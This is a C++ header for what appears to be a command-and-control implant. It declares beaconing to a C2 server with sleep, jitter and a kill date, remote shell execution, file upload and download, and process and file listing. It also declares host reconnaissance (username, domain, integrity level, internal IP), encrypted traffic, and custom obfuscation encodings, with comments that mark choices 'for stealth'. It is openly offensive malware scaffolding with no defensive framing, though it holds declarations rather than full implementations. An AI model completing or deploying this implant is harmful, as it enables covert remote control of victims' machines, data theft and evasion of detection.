#pragma once

#include "tasks.h"
#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random>
#include <chrono>
#include <map>

#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/uuid/uuid.hpp>
#include <boost/uuid/uuid_generators.hpp>
#include <boost/uuid/uuid_io.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/archive/iterators/base64_from_binary.hpp>
#include <boost/archive/iterators/binary_from_base64.hpp>
#include <boost/archive/iterators/transform_width.hpp>


struct AgentInfo {
    std::string id;
    std::string hostname;
    std::string username;
    std::string domain;
    std::string os;
    std::string arch;
    uint32_t process_id;
    std::string process_name;
    std::string integrity_level;
    std::string internal_ip;
    std::string working_directory;
    uint64_t sleep_interval;  // seconds between check-ins
    float jitter;             // percentage of sleep_interval to randomize
    std::string encryption_key; // Base64 encoded AES key

    AgentInfo();
    void collectSystemInfo();
};

struct Implant {
    Implant(std::string host, std::string port, std::string uri);
    Implant(std::string host, std::string port, std::string uri, std::string encryption_key);

    std::future<void> taskThread;
    void beacon();
    void setMeanDwell(double meanDwell);
    void setRunning(bool isRunning);
    void serviceTasks();
    bool registerWithC2();
    void updateSleepSettings(uint64_t newSleep, float newJitter);

private:
    const std::string host, port, uri;
    AgentInfo agentInfo;
    std::exponential_distribution<double> dwellDistributionSeconds;
    std::atomic_bool isRunning;
    std::mutex taskMutex, resultsMutex, encryptionMutex;
    boost::property_tree::ptree results;
    std::vector<Task> tasks;
    std::vector<TaskResult> taskResults;
    std::random_device device;
    std::mt19937 generator;
    
    // Static members for UUID generation
    static std::random_device rd;
    static std::mt19937 gen;
    
    // UUID generator
    boost::uuids::random_generator uuidGenerator;

    // Encryption support
    bool encryptionEnabled;
    std::string encryptionKey;

    // C2 communication
    void parseTasks(const std::string &response);
    [[nodiscard]] std::string sendResults();
    [[nodiscard]] std::string createBeaconData();
    [[nodiscard]] std::string encryptPayload(const std::string &plaintext);
    [[nodiscard]] std::string decryptPayload(const std::string &ciphertext);

    // Task execution
    TaskResult executeTask(const Task& task);
    TaskResult executeShellCommand(const Task& task);
    TaskResult executeSystemInfo(const Task& task);
    TaskResult executeProcessList(const Task& task);
    TaskResult executeFileList(const Task& task);
    TaskResult executeDownload(const Task& task);
    TaskResult executeUpload(const Task& task);

    // Utility functions
    std::string generateRandomId(size_t length = 16);
    std::chrono::milliseconds calculateSleepTime();
    bool isKillDateReached();
    void logError(const std::string& error);
    
    // Base64 encoding/decoding functions
    std::string base64Encode(const std::vector<uint8_t>& data);
    std::string base64Encode(const std::string& data);
    std::vector<uint8_t> base64Decode(const std::string& encoded);
    std::string base64DecodeString(const std::string& encoded);
    
    // Reverse base64 encoding/decoding for enhanced obfuscation
    std::string reverseBase64Encode(const std::vector<uint8_t>& data);
    std::string reverseBase64Encode(const std::string& data);
    std::vector<uint8_t> reverseBase64Decode(const std::string& encoded);
    std::string reverseBase64DecodeString(const std::string& encoded);
    
    // Advanced obfuscation: case-alternating reverse base64
    std::string advancedObfuscateEncode(const std::vector<uint8_t>& data);
    std::string advancedObfuscateEncode(const std::string& data);
    std::vector<uint8_t> advancedObfuscateDecode(const std::string& encoded);
    std::string advancedObfuscateDecodeString(const std::string& encoded);
    
    // File operations
    std::vector<uint8_t> readFileToBytes(const std::string& filepath);
    bool writeBytesToFile(const std::string& filepath, const std::vector<uint8_t>& data);
    bool fileExists(const std::string& filepath);
    
    // Command obfuscation
    std::string decodeCommand(const std::string& encoded_command);
    std::string encodeOutput(const std::string& output);
    
    // Utility functions for string reversal
    std::string reverseString(const std::string& str);
    bool isReversedBase64(const std::string& str);
    
    // Advanced obfuscation utility functions
    std::string alternateCase(const std::string& str);
    std::string normalizeCase(const std::string& str);
    bool isAdvancedObfuscated(const std::string& str);
    std::string mixedCaseReverse(const std::string& str);

    // UUID generation helpers
    std::string generateAgentId() {
        std::string full_uuid = boost::uuids::to_string(uuidGenerator());
        return full_uuid.substr(0, 8); // Short 8-char ID for stealth
    }
    std::string generateTaskId() { return boost::uuids::to_string(uuidGenerator()); }
    std::string generateSessionId() {
        std::string full_uuid = boost::uuids::to_string(uuidGenerator());
        std::string clean;
        for (char c : full_uuid) {
            if (c != '-') clean += c;
            if (clean.length() >= 12) break;
        }
        return clean;
    }
};

// HTTP communication functions
[[nodiscard]] std::string sendHttpRequest(std::string_view host, std::string_view port, std::string_view uri, std::string_view payload);
[[nodiscard]] std::string sendHttpRequest(std::string_view host, std::string_view port, std::string_view uri, std::string_view payload, const std::map<std::string, std::string>& headers);

// Utility functions for system information gathering
[[nodiscard]] std::string getHostname();
[[nodiscard]] std::string getCurrentUsername();
[[nodiscard]] std::string getDomainName();
[[nodiscard]] std::string getOperatingSystem();
[[nodiscard]] std::string getArchitecture();
[[nodiscard]] std::string getProcessName();
[[nodiscard]] std::string getIntegrityLevel();
[[nodiscard]] std::string getInternalIP();
[[nodiscard]] std::string getCurrentWorkingDirectory();
[[nodiscard]] uint32_t getCurrentProcessId();

// Base64 utility functions (standalone)
[[nodiscard]] std::string base64_encode_data(const std::vector<uint8_t>& data);
[[nodiscard]] std::string base64_encode_string(const std::string& str);
[[nodiscard]] std::vector<uint8_t> base64_decode_to_bytes(const std::string& encoded);
[[nodiscard]] std::string base64_decode_to_string(const std::string& encoded);

// Reverse base64 utility functions (standalone)
[[nodiscard]] std::string reverse_base64_encode_data(const std::vector<uint8_t>& data);
[[nodiscard]] std::string reverse_base64_encode_string(const std::string& str);
[[nodiscard]] std::vector<uint8_t> reverse_base64_decode_to_bytes(const std::string& encoded);
[[nodiscard]] std::string reverse_base64_decode_to_string(const std::string& encoded);
[[nodiscard]] std::string reverse_string(const std::string& str);

// Advanced obfuscation utility functions (standalone)
[[nodiscard]] std::string advanced_obfuscate_encode_data(const std::vector<uint8_t>& data);
[[nodiscard]] std::string advanced_obfuscate_encode_string(const std::string& str);
[[nodiscard]] std::vector<uint8_t> advanced_obfuscate_decode_to_bytes(const std::string& encoded);
[[nodiscard]] std::string advanced_obfuscate_decode_to_string(const std::string& encoded);
[[nodiscard]] std::string alternate_case(const std::string& str);
[[nodiscard]] std::string normalize_case(const std::string& str);
[[nodiscard]] bool is_advanced_obfuscated(const std::string& str);
